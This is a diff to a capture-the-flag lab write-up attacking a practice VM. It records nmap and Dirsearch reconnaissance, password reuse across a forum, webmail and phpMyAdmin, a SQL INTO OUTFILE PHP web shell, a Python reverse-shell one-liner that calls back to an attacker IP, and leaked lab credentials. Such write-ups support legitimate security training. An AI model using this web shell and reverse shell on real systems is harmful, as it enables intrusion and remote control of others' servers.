@@ -9,12 +9,9 @@ _There will be no visible IP address, and there’s a reason why..._
 
 To get the Ip address we used "nmap" cause we used bridge, For a "Bridged" virtual network adapter, the host shares its physical adapters, i.e. the VM basically connects to the network like any other physical system. so we got my ip by ifconfig and then we scaned by netmask /24.
 
-
-
 > nmap -A 10.12.100.1/24
 
-
-After the scan finished, we got this result 
+After the scan finished, we got this result
 
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 18:24 +01
@@ -76,7 +73,7 @@ For the secend one we used a tool named `Dirsearch`.
 
 `Dirsearch` is a tool written in Python used to `brute-force` hidden web directories and files.
 
-After run the command tool we got this result: 
+After run the command tool we got this result:
 
 ```
 ./dirsearch.py -u http://10.12.100.74
@@ -131,7 +128,7 @@ We can see that there is some important directories like :
 
 > /forum
 
-But we don't have permission to access /forum on this server with http, And as wen now we have also the `https:443` port so 
+But we don't have permission to access /forum on this server with http, And as wen now we have also the `https:443` port so
 we try to `Dirsearch` with the https on `https://10.12.100.74/`, and this is what we got.
 
 ```
@@ -164,13 +161,13 @@ Task Completed
 
 in the ` https://10.12.100.74/forum/` we found a subject named `Probleme login ?` and the author is `lmezard`.
 
-on this subject, we found a logs repports, after read this logs we found that  a password: `!q\]Ej?*5K5cy*AJ`
+on this subject, we found a logs repports, after read this logs we found that a password: `!q\]Ej?*5K5cy*AJ`
 
-this password is used to connect with the forum account. After  some search on the forum we found an email on `lmezard` profile  `laurie@borntosec.net`,
+this password is used to connect with the forum account. After some search on the forum we found an email on `lmezard` profile `laurie@borntosec.net`,
 
 > https://10.12.100.74/webmail
 
-we try to connect on the webmail page using  `laurie@borntosec.net` with the same password, and it's successful.
+we try to connect on the webmail page using `laurie@borntosec.net` with the same password, and it's successful.
 After login we found two emails, one of theme was `DB Access`.
 
 ```
@@ -186,15 +183,15 @@ We use the username and password that we got on the email to connect the databas
 
 > https://10.12.100.74/phpmyadmin
 
-we use what call php reverse shell  to create a file in `https://10.12.100.74/forum/templates_c`, and we execute it on phpmyadmin SQL requites commande like this:
+we use what call php reverse shell to create a file in `https://10.12.100.74/forum/templates_c`, and we execute it on SQL query/queries on database like this:
 
 ```
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/tmp.php';
 nc -l 80
-https://url/forum/templates_c/tmp.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+https://url/forum/templates_c/tmp.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.12.2.7",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-this command let you use bash in this machine and then i found a file in /home/LOOKATME/password contain this password `_lmezard:G!@M6f4Eatau{sF"_`
+this command let you use bash in this machine and then i found a file in /home/LOOKATME/password contain this password `lmezard:G!@M6f4Eatau{sF"`
 
 For `templates_c` folder we founde it with `Dirsearch` :
 
@@ -229,4 +226,47 @@ Target: https://10.12.100.74/forum/
 [15:37:40] 301 -  321B  - /forum/update  ->  https://10.12.100.74/forum/update/
 
 Task Completed
+```
+
+We use `lmezard:G!@M6f4Eatau{sF"` to connects with SSH but it's failed, so we trying to use FTP and is successful
+
+We Found two files `README` and `fun`, `README` contains this:
+
+> Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+on `fun` we found this :
+
+```
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
 ```
